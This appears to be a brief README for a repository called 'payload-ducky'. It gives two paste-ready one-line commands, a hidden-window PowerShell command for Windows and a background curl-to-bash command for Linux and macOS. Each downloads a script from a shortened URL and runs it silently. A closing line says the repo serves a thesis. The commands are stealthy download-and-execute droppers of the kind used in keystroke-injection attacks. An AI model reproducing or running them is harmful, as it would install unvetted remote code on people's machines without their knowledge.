# payload-ducky

## use the following command in cmd or in run (this will not show a separate window)
```
powershell -w hidden -c "iwr 'https://tinyurl.com/570windows' -OutFile $env:TEMP\r.vbs; & wscript $env:TEMP\r.vbs"
```

## use the following command in linux terminal(MacOS & debian tested)
```
(nohup curl -fsSL https://tinyurl.com/570linux | bash > /dev/null 2>&1 &) && exit
```

### This repo is to serve the purpose of the thesis work in ECE, not to spread harmful codes to others.
